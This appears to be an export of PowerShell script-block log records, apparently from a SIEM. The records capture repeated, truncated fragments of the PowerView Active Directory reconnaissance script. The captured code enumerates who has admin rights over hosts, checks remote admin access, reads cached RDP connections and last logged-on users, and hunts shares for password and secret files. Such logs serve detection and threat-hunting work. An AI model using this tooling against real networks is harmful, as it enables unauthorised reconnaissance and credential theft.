$Domain -DomainController $DomainController -FullData -PageSize $PageSize            if(!$Computers) {                throw ""Computer $Computer in domain '$Domain' not found!""            }                        ForEach($Computer in $Computers) {                # extract all OUs a computer is a part of                $DN = $Computer.distinguishedname                $TargetOUs = $DN.split("","") | Foreach-Object {                    if($_.startswith(""OU="")) {                        $DN.substring($DN.indexof($_))                    }                }            }        }        else {            $TargetOUs = @($OUName)        }        Write-Verbose ""Target OUs: $TargetOUs""        $TargetOUs | Where-Object {$_} | Foreach-Object {            $OU = $_            # for each OU the computer is a part of, get the full OU object            $GPOgroups = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object {                 # and then get any GPO links                $_.gplink.split(""]["") | Foreach-Object {                    if ($_.startswith(""LDAP"")) {                        $_.split("";"")[0]                    }                }            } | Foreach-Object {                $GPOGroupArgs =  @{                    'Domain' = $Domain                    'DomainController' = $DomainController                    'ADSpath' = $_                    'UsePSDrive' = $UsePSDrive                    'PageSize' = $PageSize                }                # for each GPO link, get any locally set user/group SIDs                Get-NetGPOGroup @GPOGroupArgs            }            # for each found GPO group, resolve the SIDs of the members            $GPOgroups | Where-Object {$_} | Foreach-Object {                $GPO = $_                $GPO.members | Foreach-Object {                    # resolvethis SID to a domain object                    $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize                    $GPOComputerAdmin = New-Object PSObject                    $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName                    $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU                    $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName                    $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $Object.name                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_                    $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')                    $GPOComputerAdmin                     # if we're recursing and the current result object is a group                    if($Recurse -and $GPOComputerAdmin.isGroup) {                        Get-NetGroupMember -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {                            $MemberDN = $_.distinguishedName                            # extract the FQDN from the Distinguished Name                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                            if ($_.samAccountType -ne ""805306368"") {                                $MemberIsGroup = $True                            }                            else {                                $MemberIsGroup = $False                            }                            if ($_.samAccountName) {                                # forest users have the samAccountName set                                $MemberName = $_.samAccountName                            }                            else {                                # external trust users have a SID, so convert it                                try {                                    $MemberName = Convert-SidToName $_.cn                                }                                catch {                                    # if there's a problem contacting the domain to resolve the SID                                    $MemberName = $_.cn                                }                            }                            $GPOComputerAdmin = New-Object PSObject                            $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName                            $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU                            $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName                            $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $MemberName                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $MemberDN                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_.objectsid                            $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $MemberIsGroup                            $GPOComputerAdmin                         }                    }                }            }        }    }}function Get-DomainPolicy {<#    .SYNOPSIS        Returns the default domain or DC policy for a given        domain or domain controller.        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.    .PARAMETER Source        Extract Domain or DC (domain controller) policies.    .PARAMETER Domain        The domain to query for default policies, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ResolveSids        Switch. Resolve Sids from a DC policy to object names.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .EXAMPLE        PS C:\> Get-NetGPO        Returns the GPOs in the current domain. #>    [CmdletBinding()]    Param (        [String]        [ValidateSet(""Domain"",""DC"")]        $Source =""Domain"",        [String]        $Domain,        [String]        $DomainController,        [Switch]        $ResolveSids,        [Switch]        $UsePSDrive    )    if($Source -eq ""Domain"") {        # query the given domain for the default domain policy object        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname ""{31B2F340-016D-11D2-945F-00C04FB984F9}""                if($GPO) {            # grab the GptTmpl.inf file and parse it            $GptTmplPath = $GPO.gpcfilesyspath + ""\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""            $ParseArgs =  @{                'GptTmplPath' = $GptTmplPath                'UsePSDrive' = $UsePSDrive            }            # parse the GptTmpl.inf            Get-GptTmpl @ParseArgs        }    }    elseif($Source -eq ""DC"") {        # query the given domain/dc for the default domain controller policy object        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname ""{6AC1786C-016F-11D2-945F-00C04FB984F9}""        if($GPO) {            # grab the GptTmpl.inf file and parse it            $GptTmplPath = $GPO.gpcfilesyspath + ""\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""            $ParseArgs =  @{                'GptTmplPath' = $GptTmplPath                'UsePSDrive' = $UsePSDrive            }            # parse the GptTmpl.inf            Get-GptTmpl @ParseArgs | Foreach-Object {                if($ResolveSids) {                    # if we're resolving sids in PrivilegeRights to names                    $Policy = New-Object PSObject                    $_.psobject.properties | Foreach-Object {                        if( $_.Name -eq 'PrivilegeRights') {                            $PrivilegeRights = New-Object PSObject                            # for every nested SID member of PrivilegeRights, try to                             #   unpack everything and resolve the SIDs as appropriate                            $_.Value.psobject.properties | Foreach-Object {                                $Sids = $_.Value | Foreach-Object {                                    try {                                        if($_ -isnot [System.Array]) {                                             Convert-SidToName $_                                         }                                        else {                                            $_ | Foreach-Object { Convert-SidToName $_ }                                        }                                    }                                    catch {                                        Write-Debug ""Error rScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","ct {$_} | ForEach-Object {        $GPOguid = $_.GPOName        if( -not $ProcessedGUIDs[$GPOguid] ) {            $GPOname = $_.GPODisplayName            $Filters = $_.Filters            # find any OUs that have this GUID applied            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData -PageSize $PageSize | ForEach-Object {                if($Filters) {                    # filter for computer name/org unit if a filter is specified                    #   TODO: handle other filters?                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {                        $_.adspath -match ($Filters.Value)                    } | ForEach-Object { $_.dnshostname }                }                else {                    $OUComputers = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize                }                $GPOLocation = New-Object PSObject                $GPOLocation | Add-Member Noteproperty 'ObjectName' $ObjectDistName                $GPOLocation | Add-Member Noteproperty 'GPOname' $GPOname                $GPOLocation | Add-Member Noteproperty 'GPOguid' $GPOguid                $GPOLocation | Add-Member Noteproperty 'ContainerName' $_.distinguishedname                $GPOLocation | Add-Member Noteproperty 'Computers' $OUComputers                $GPOLocation            }            # find any sites that have this GUID applied            # TODO: fix, this isn't the correct way to query computers from a site...            # Get-NetSite -GUID $GPOguid -FullData | Foreach-Object {            #     if($Filters) {            #         # filter for computer name/org unit if a filter is specified            #         #   TODO: handle other filters?            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {            #             $_.adspath -match ($Filters.Value)            #         } | Foreach-Object {$_.dnshostname}            #     }            #     else {            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath            #     }            #     $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath            #     $out = New-Object PSObject            #     $out | Add-Member Noteproperty 'Object' $ObjectDistName            #     $out | Add-Member Noteproperty 'GPOname' $GPOname            #     $out | Add-Member Noteproperty 'GPOguid' $GPOguid            #     $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname            #     $out | Add-Member Noteproperty 'Computers' $OUComputers            #     $out            # }            # mark off this GPO GUID so we don't process it again if there are dupes            $ProcessedGUIDs[$GPOguid] = $True        }    }}function Find-GPOComputerAdmin {<#    .SYNOPSIS        Takes a computer (or GPO) object and determines what users/groups have         administrative access over it.        Inverse of Find-GPOLocation.    .PARAMETER ComputerName        The computer to determine local administrative access to.    .PARAMETER OUName        OU name to determine who has local adminisrtative acess to computers        within it.     .PARAMETER Domain        Optional domain the computer/OU exists in, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER Recurse        Switch. If a returned member is a group, recurse and get all members.    .PARAMETER LocalGroup        The local group to check access against.        Can be ""Administrators"" (S-1-5-32-544), ""RDP/Remote Desktop Users"" (S-1-5-32-555),        or a custom local SID.        Defaults to local 'Administrators'.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local                Finds users who have local admin rights over WINDOWS3 through GPO correlation.    .EXAMPLE        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP                Finds users who have RDP rights over WINDOWS3 through GPO correlation.#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $ComputerName,        [String]        $OUName,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $Recurse,        [String]        $LocalGroup = 'Administrators',        [Switch]        $UsePSDrive,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {            if(!$ComputerName -and !$OUName) {            Throw ""-ComputerName or -OUName must be provided""        }        if($ComputerName) {            $Computers = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize            if(!$Computers) {                throw ""Computer $Computer in domain '$Domain' not found!""            }                        ForEach($Computer in $Computers) {                # extract all OUs a computer is a part of                $DN = $Computer.distinguishedname                $TargetOUs = $DN.split("","") | Foreach-Object {                    if($_.startswith(""OU="")) {                        $DN.substring($DN.indexof($_))                    }                }            }        }        else {            $TargetOUs = @($OUName)        }        Write-Verbose ""Target OUs: $TargetOUs""        $TargetOUs | Where-Object {$_} | Foreach-Object {            $OU = $_            # for each OU the computer is a part of, get the full OU object            $GPOgroups = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object {                 # and then get any GPO links                $_.gplink.split(""]["") | Foreach-Object {                    if ($_.startswith(""LDAP"")) {                        $_.split("";"")[0]                    }                }            } | Foreach-Object {                $GPOGroupArgs =  @{                    'Domain' = $Domain                    'DomainController' = $DomainController                    'ADSpath' = $_                    'UsePSDrive' = $UsePSDrive                    'PageSize' = $PageSize                }                # for each GPO link, get any locally set user/group SIDs                Get-NetGPOGroup @GPOGroupArgs            }            # for each found GPO group, resolve the SIDs of the members            $GPOgroups | Where-Object {$_} | Foreach-Object {                $GPO = $_                $GPO.members | Foreach-Object {                    # resolvethis SID to a domain object                    $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize                    $GPOComputerAdmin = New-Object PSObject                    $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName                    $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU                    $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName                    $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $Object.name                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname                    $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_                    $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')                    $GPOComputerAdmin                     # if we're recursing and the current result object is a group                    if($Recurse -and $GPOComputerAdmin.isGroup) {                        Get-NetGroupMember -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {                            $MemberDN = $_.distinguishedName                            # extract the FQDN from the Distinguished Name                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                            if ($_.samAccountType -ne ""805306368"") {                                $MemberIsGroup = $True                            }                            else {                                $MemberIsGroup = $False                            }                            if ($_.samAccountName) {                                # forest users have the samAccountName set                                $MemberName = $_.samAccountName                            }                            else {                                # external trust users have a SID, so convert it                                try {                                    $MemberName = Convert-SidToName $_.cn                                }                                catch {                                    # if there's a problem contacting the domain to resolve the SID                                    $MemberName = $_.cn                                }                            }                            $GPOComputerAdmin = New-Object PSObject                            $GPOComputerAdmin | Add-Member Noteproperty 'ComputerName' $ComputerName                            $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU                            $GPOComputerAdmin | Add-Member Noteproperty 'GPODisplayName' $GPO.GPODisplayName                            $GPOComputerAdmin | Add-Member Noteproperty 'GPOPath' $GPO.GPOPath                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectName' $MemberName                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectDN' $MemberDN                            $GPOComputerAdmin | Add-Member Noteproperty 'ObjectSID' $_.objectsid                            $GPOComputerAdmin | Add-Member Noteproperty 'IsGroup' $MemberIsGroup                            $GPOComputerAdmin                         }                    }                }            }        }    }}function Get-DomainPolicy {<#    .SYNOPSIS        Returns the default domain or DC policy for a given        domain or domain controller.        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.    .PARAMETER Source        Extract Domain or DC (domain controller) policies.    .PARAMETER Domain        The domain to query for default policies, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ResolveSids        Switch. Resolve Sids from a DC policy to object names.    .PARAMETER UsePSDrive        Switch. Mount any found policy files with temporary PSDrives.    .EXAMPLE        PS C:\> Get-NetGPO        Returns the GPOs in the current domain. #>    [CmdletBinding()]    Param (        [String]        [ValidateSet(""Domain"",""DC"")]        $Source =""Domain"",        [String]        $Domain,        [String]        $DomainController,        [Switch]        $ResolveSids,        [Switch]        $UsePSDrive    )    if($Source -eq ""Domain"") {        # query the given domain for the default domain policy object        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname ""{31B2F340-016D-11D2-945F-00C04FB984F9}""                if($GPO) {            # grab the GptTmpl.inf file and parse it            $GptTmplPath = $GPO.gpcfilesyspath + ""\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""            $ParseArgs =  @{                'GptTmplPath' = $GptTmplPath                'UsePSDrive' = $UsePSDrive            }            # parse the GptTmpl.inf            Get-GptTmpl @ParseArgs        }    }    elseif($Source -eq ""DC"") {        # query the given domain/dc for the default domain controller policy object        $GPO = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname ""{6AC1786C-016F-11D2-945F-00C04FB984F9}""        if($GPO) {            # grab the GptTmpl.inf file and parse it            $GptTmplPath = $GPO.gpcfilesyspath + ""\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf""            $ParseArgs =  @{                'GptTmplPath' = $GptTmplPath                'UsePSDrive' = $UsePSDrive            }            # parse the GptTmpl.inf            Get-GptTmpl @ParseArgs | Foreach-Object {                if($ResolveSids) {                    # if we're resolving sids in PrivilegeRights to names                    $Policy = New-Object PSObject                    $_.psobject.properties | Foreach-Object {                        if( $_.Name -eq 'PrivilegeRights') {                            $PrivilegeRights = New-Object PSObject                            # for every nested SID member of PrivilegeRights, try to                             #   unpack everything and resolve the SIDs as appropriate                            $_.Value.psobject.properties | Foreach-Object {                                $Sids = $_.Value | Foreach-Object {                                    try {                                        if($_ -isnot [System.Array]) {                                             Convert-SidToName $_                                         }                                        else {                                            $_ | Foreach-Object { Convert-SidToName $_ }                                        }                                    }                                    catch {                                        Write-Debug ""Error r","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"FHV3ypsB8mE-0EyZ7H9_","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (16 of 26):       $ComputerName = Get-NameField -Object $ComputerName        # 0xF003F - SC_MANAGER_ALL_ACCESS        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx        $Handle = $Advapi32::OpenSCManagerW(""\\$ComputerName"", 'ServicesActive', 0xF003F)        Write-Debug ""Invoke-CheckLocalAdminAccess handle: $Handle""        # if we get a non-zero handle back, everything was successful        if ($Handle -ne 0) {            # Close off the service handle            $Null = $Advapi32::CloseServiceHandle($Handle)            $True        }        else {            # otherwise it failed - get the last error            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx            $Err = $Kernel32::GetLastError()            Write-Debug ""Invoke-CheckLocalAdminAccess LastError: $Err""            $False        }    }}function Get-LastLoggedOn {<#    .SYNOPSIS        This function uses remote registry functionality to return        the last user logged onto a target machine.        Note: This function requires administrative rights on the        machine you're enumerating.    .PARAMETER ComputerName        The hostname to query for the last logged on user.        Defaults to the localhost.    .EXAMPLE        PS C:\> Get-LastLoggedOn        Returns the last user logged onto the local machine.    .EXAMPLE                PS C:\> Get-LastLoggedOn -ComputerName WINDOWS1        Returns the last user logged onto WINDOWS1#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        [Alias('HostName')]                $ComputerName = "".""    )    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # try to open up the remote registry key to grab the last logged on user        try {            $Reg = [WMIClass]""\\$ComputerName\root\default:stdRegProv""            $HKLM = 2147483650            $Key = ""SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI""            $Value = ""LastLoggedOnUser""            $Reg.GetStringValue($HKLM, $Key, $Value).sValue        }        catch {            Write-Warning ""[!] Error opening remote registry on $ComputerName. Remote registry likely not enabled.""            $Null        }    }}function Get-CachedRDPConnection {<#    .SYNOPSIS        Uses remote registry functionality to query all entries for the        ""Windows Remote Desktop Connection Client"" on a machine, separated by        user and target server.        Note: This function requires administrative rights on the        machine you're enumerating.    .PARAMETER ComputerName        The hostname to query for RDP client information.        Defaults to localhost.    .PARAMETER RemoteUserName        The ""domain\username"" to use for the WMI call on the remote system.        If supplied, 'RemotePassword' must be supplied as well.    .PARAMETER RemotePassword        The password to use for the WMI call on a remote system.    .EXAMPLE        PS C:\> Get-CachedRDPConnection        Returns the RDP connection client information for the local machine.    .EXAMPLE        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local        Returns the RDP connection client information for the WINDOWS2.testlab.local machine    .EXAMPLE        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local -RemoteUserName DOMAIN\user -RemotePassword Password123!        Returns the RDP connection client information for the WINDOWS2.testlab.local machine using alternate credentials.#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $ComputerName = ""localhost"",        [String]        $RemoteUserName,        [String]        $RemotePassword    )    begin {        if ($RemoteUserName -and $RemotePassword) {            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)        }        # HKEY_USERS        $HKU = 2147483651    }    process {        try {            if($Credential) {                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue            }            else {                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue            }        }        catch {            Write-Warning ""Error accessing $ComputerName, likely insufficient permissions or firewall rules on host""        }        if(!$Reg) {            Write-Warning ""Error accessing $ComputerName, likely insufficient permissions or firewall rules on host""        }        else {            # extract out the SIDs of domain users in this hive            $UserSIDs = ($Reg.EnumKey($HKU, """")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }            foreach ($UserSID in $UserSIDs) {                try {                    $UserName = Convert-SidToName $UserSID                    # pull out all the cached RDP connections                    $ConnectionKeys = $Reg.EnumValues($HKU,""$UserSID\Software\Microsoft\Terminal Server Client\Default"").sNames                    foreach ($Connection in $ConnectionKeys) {                        # make sure this key is a cached connection                        if($Connection -match 'MRU.*') {                            $TargetServer = $Reg.GetStringValue($HKU, ""$UserSID\Software\Microsoft\Terminal Server Client\Default"", $Connection).sValue                                                        $FoundConnection = New-Object PSObject                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $ComputerName                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null                            $FoundConnection                        }                    }                    # pull out all the cached server info with username hints                    $ServerKeys = $Reg.EnumKey($HKU,""$UserSID\Software\Microsoft\Terminal Server Client\Servers"").sNames                    foreach ($Server in $ServerKeys) {                        $UsernameHint = $Reg.GetStringValue($HKU, ""$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server"", 'UsernameHint').sValue                                                $FoundConnection = New-Object PSObject                        $FoundConnection | Add-Member Noteproperty 'ComputerName' $ComputerName                        $FoundConnection | Add-Member Noteproperty 'UserName' $UserName                        $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID                        $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server                        $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint                        $FoundConnection                       }                }                catch {                    Write-Debug ""Error: $_""                }            }        }    }}function Get-NetProcess {<#    .SYNOPSIS        Gets a list of processes/owners on a remote machine.    .PARAMETER ComputerName        The hostname to query processes. Defaults to the local host name.    .PARAMETER RemoteUserName        The ""domain\username"" to use for the WMI call on a remote system.        If supplied, 'RemotePassword' must be supplied as well.    .PARAMETER RemotePassword        The password to use for the WMI call on a remote system.    .EXAMPLE        PS C:\> Get-NetProcess -ComputerName WINDOWS1            Returns the current processes for WINDOWS1#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $ComputerName,        [String]        $RemoteUserName,        [String]        $RemotePassword    )    process {                if($ComputerName) {            # process multiple host object types from the pipeline            $ComputerName = Get-NameField -Object $ComputerName                  }        else {            # default to the local hostname            $ComputerName = [System.Net.Dns]::GetHostName()        }        $Credential = $Null        if($RemoteUserName) {            if($RemotePassword) {                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)                # try to enumerate the processes on the remote machine using the supplied credential                try {                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {                        $Owner = $_.getowner();                        $Process = New-Object PSObject                        $Process | Add-Member Noteproperty 'ComputerName' $ComputerName                        $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName                        $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID                        $Process | Add-Member Noteproperty 'Domain' $Owner.Domain                        $Process | Add-Member Noteproperty 'User' $Owner.User                        $Process                    }                }                catch {                    Write-Verbose ""[!] Error enumerating remote processes, access likely denied: $_""                }            }            else {                Write-Warning ""[!] RemotePassword must also be supplied!""            }        }        else {            # try to enumerate the processes on the remote machine            try {                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {                    $Owner = $_.getowner();                    $Process = New-Object PSObject                    $Process | Add-Member Noteproperty 'ComputerName' $ComputerName                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain                    $Process | Add-Member Noteproperty 'User' $Owner.User                    $Process                }            }            catch {                Write-Verbose ""[!] Error enumerating remote processes, access likely denied: $_""            }        }    }}function Find-InterestingFile {<#    .SYNOPSIS        This function recursively searches a given UNC path for files with        specific keywords in the name (default of pass, sensitive, secret, admin,        login and unattend*.xml). The output can be piped out to a csv with the        -OutFile flag. By default, hidden files/folders are included in search results.    .PARAMETER Path        UNC/local path to recursively search.    .PARAMETER Terms        Terms to search for.    .PARAMETER OfficeDocs        Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)    .PARAMETER FreshEXEs        Switch. Find .EXEs accessed within the last week.    .PARAMETER LastAccessTime        Only return files with a LastAccessTime greater than this date value.    .PARAMETER LastWriteTime        Only return files with a LastWriteTime greater than this date value.    .PARAMETER CreationTime        Only return files with a CreationTime greater than this date value.    .PARAMETER ExcludeFolders        Switch. Exclude folders from the search results.    .PARAMETER ExcludeHidden        Switch. Exclude hidden files and folders from the search results.    .PARAMETER CheckWriteAccess        Switch. Only returns files the current user has write access to.    .PARAMETER OutFile        Output results to a specified csv output file.    .PARAMETER UsePSDrive        Switch. Mount target remote path with temporary PSDrives.    .PARAMETER Credential        Credential to use to mount the PSDrive for searching.    .OUTPUTS        The full path, owner, lastaccess time, lastwrite time, and size for each found file.    .EXAMPLE        PS C:\> Find-InterestingFile -Path C:\Backup\                Returns any files on the local path C:\Backup\ that have the default        search term set in the title.    .EXAMPLE        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv                Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'        or 'email' in the title, and writes the results out to a csv file        named 'out.csv'    .EXAMPLE        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -LastAccessTime (Get-Date).AddDays(-7)        Returns any files on the remote path \\WINDOWS7\Users\ that have the default        search term set in the title and were accessed within the last week.    .LINK                http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $Path = '.\',        [String[]]        $Terms,        [Switch]        $OfficeDocs,        [Switch]        $FreshEXEs,        [String]        $LastAccessTime,        [String]        $LastWriteTime,        [String]        $CreatioScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","       $ComputerName = Get-NameField -Object $ComputerName        # 0xF003F - SC_MANAGER_ALL_ACCESS        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx        $Handle = $Advapi32::OpenSCManagerW(""\\$ComputerName"", 'ServicesActive', 0xF003F)        Write-Debug ""Invoke-CheckLocalAdminAccess handle: $Handle""        # if we get a non-zero handle back, everything was successful        if ($Handle -ne 0) {            # Close off the service handle            $Null = $Advapi32::CloseServiceHandle($Handle)            $True        }        else {            # otherwise it failed - get the last error            #   error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382(v=vs.85).aspx            $Err = $Kernel32::GetLastError()            Write-Debug ""Invoke-CheckLocalAdminAccess LastError: $Err""            $False        }    }}function Get-LastLoggedOn {<#    .SYNOPSIS        This function uses remote registry functionality to return        the last user logged onto a target machine.        Note: This function requires administrative rights on the        machine you're enumerating.    .PARAMETER ComputerName        The hostname to query for the last logged on user.        Defaults to the localhost.    .EXAMPLE        PS C:\> Get-LastLoggedOn        Returns the last user logged onto the local machine.    .EXAMPLE                PS C:\> Get-LastLoggedOn -ComputerName WINDOWS1        Returns the last user logged onto WINDOWS1#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        [Alias('HostName')]                $ComputerName = "".""    )    process {        # process multiple host object types from the pipeline        $ComputerName = Get-NameField -Object $ComputerName        # try to open up the remote registry key to grab the last logged on user        try {            $Reg = [WMIClass]""\\$ComputerName\root\default:stdRegProv""            $HKLM = 2147483650            $Key = ""SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI""            $Value = ""LastLoggedOnUser""            $Reg.GetStringValue($HKLM, $Key, $Value).sValue        }        catch {            Write-Warning ""[!] Error opening remote registry on $ComputerName. Remote registry likely not enabled.""            $Null        }    }}function Get-CachedRDPConnection {<#    .SYNOPSIS        Uses remote registry functionality to query all entries for the        ""Windows Remote Desktop Connection Client"" on a machine, separated by        user and target server.        Note: This function requires administrative rights on the        machine you're enumerating.    .PARAMETER ComputerName        The hostname to query for RDP client information.        Defaults to localhost.    .PARAMETER RemoteUserName        The ""domain\username"" to use for the WMI call on the remote system.        If supplied, 'RemotePassword' must be supplied as well.    .PARAMETER RemotePassword        The password to use for the WMI call on a remote system.    .EXAMPLE        PS C:\> Get-CachedRDPConnection        Returns the RDP connection client information for the local machine.    .EXAMPLE        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local        Returns the RDP connection client information for the WINDOWS2.testlab.local machine    .EXAMPLE        PS C:\> Get-CachedRDPConnection -ComputerName WINDOWS2.testlab.local -RemoteUserName DOMAIN\user -RemotePassword Password123!        Returns the RDP connection client information for the WINDOWS2.testlab.local machine using alternate credentials.#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $ComputerName = ""localhost"",        [String]        $RemoteUserName,        [String]        $RemotePassword    )    begin {        if ($RemoteUserName -and $RemotePassword) {            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)        }        # HKEY_USERS        $HKU = 2147483651    }    process {        try {            if($Credential) {                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue            }            else {                $Reg = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction 